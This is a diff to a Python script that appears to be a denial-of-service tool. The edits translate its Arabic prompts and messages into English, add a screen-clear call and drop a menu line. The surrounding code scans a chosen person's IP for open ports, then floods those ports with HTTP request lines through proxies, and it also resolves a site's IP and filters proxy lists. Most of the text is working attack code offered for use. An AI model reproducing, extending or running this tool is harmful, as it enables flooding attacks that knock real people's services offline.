@@ -1,3 +1,5 @@
+import os
+os.system ('clear')
 import json as m
 import json
 import requests as re
@@ -25,7 +27,6 @@ slow(Fore.LIGHTWHITE_EX+"""
 ========================================================
 [1]Attacks
 [2]extract ip site
-[3]To filter proxies from ports
 ========================================================""")
 mylock = threading.Lock()
 
@@ -49,9 +50,9 @@ def attack(proxy, target, portlast):
                 s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                 s.sendto(("Host: " + proxy + "\r\n\r\n").encode('ascii'), (target, port))
                 s.close()
-                sprint(Fore.GREEN+f"تم مهاجمة: {target} | المنفذ: {proxy}:{port}")
+                sprint(Fore.GREEN+f"been attacked : {target} | port : {proxy}:{port}")
             except:
-                sprint(Fore.RED + f"لم يتم مهاجمة: {target} | المنفذ: {proxy}:{port}")
+                sprint(Fore.RED + f"It is not attacked : {target} | port : {proxy}:{port}")
             continue
     running -= 1
 
@@ -61,7 +62,7 @@ def first1(target):
     ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109, 110, 115, 118, 443, 194, 161, 445, 156, 137, 139,
              3306]
     portlast = []
-    for port in tqdm(ports,desc="جاري فحص البورتات المفتوحة",bar_format="%s{l_bar}%s{bar}%s{r_bar}" % (Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX)):
+    for port in tqdm(ports,desc="Open ports are being checked ",bar_format="%s{l_bar}%s{bar}%s{r_bar}" % (Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTWHITE_EX)):
         a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         a_socket.settimeout(2)
         result_of_check = a_socket.connect_ex((target, port))
@@ -71,9 +72,9 @@ def first1(target):
         else:
             pass
         a_socket.close()
-    slow(Fore.LIGHTWHITE_EX+f"عدد البورتات المفتوحة: {len(portlast)}")
+    slow(Fore.LIGHTWHITE_EX+f"The number of open ports : {len(portlast)}")
     if len(portlast) == 0:
-        slow(Fore.LIGHTWHITE_EX+"لا يمكن تنفيذ الهجوم عدد البورتات المفتوحة 0")
+        slow(Fore.LIGHTWHITE_EX+"The attack cannot be executed for the number of open ports 0")
         exit()
     else:
         pass
@@ -95,7 +96,7 @@ def first2(target):
     lastip = thirdip.replace("www.", "")
     ip = socket.gethostbyname(lastip+".com")
     slow(Fore.LIGHTWHITE_EX+"========================================================")
-    slow(Fore.LIGHTWHITE_EX+f"ايبي الشخص هو : {ip}")
+    slow(Fore.LIGHTWHITE_EX+f"The person's IP address is : {ip}")
     exit()
 
 
@@ -113,20 +114,20 @@ def first3(file):
         with open("proxy.txt", "a") as filters:
             filters.write(save+"\n")
     slow(Fore.LIGHTWHITE_EX+"========================================================")
-    slow(Fore.LIGHTWHITE_EX+"امسح السطر الفاضي في ملف proxy.txt و ارجع شغل الاداة.")
+    slow(Fore.LIGHTWHITE_EX+"Clear the blank line in the proxy.txt file and run the tool again.")
     exit()
 
 
 first = input("Choose a number: ")
 if first == "1":
-    target = input("ضع ايبي الشخص الي بتنفذ عليه الهجمات: ")
+    target = input("Put the IP of the person you are attacking: ")
     first1(target)
 elif first == "2":
-    target = str(input("ضع رابط الي بتطلع ايبيه: "))
+    target = str(input("Put the link you are looking for: "))
     first2(target)
 elif first == "3":
     file = open('proxy.txt', 'r').read().splitlines()
     first3(file)
 else:
     slow(Fore.LIGHTWHITE_EX+"========================================================")
-    slow(Fore.LIGHTWHITE_EX+"يا غبي اختار 1 ولا 2 ولا 3")
+    slow(Fore.LIGHTWHITE_EX+"Dude, choose 1, 2, or 3")
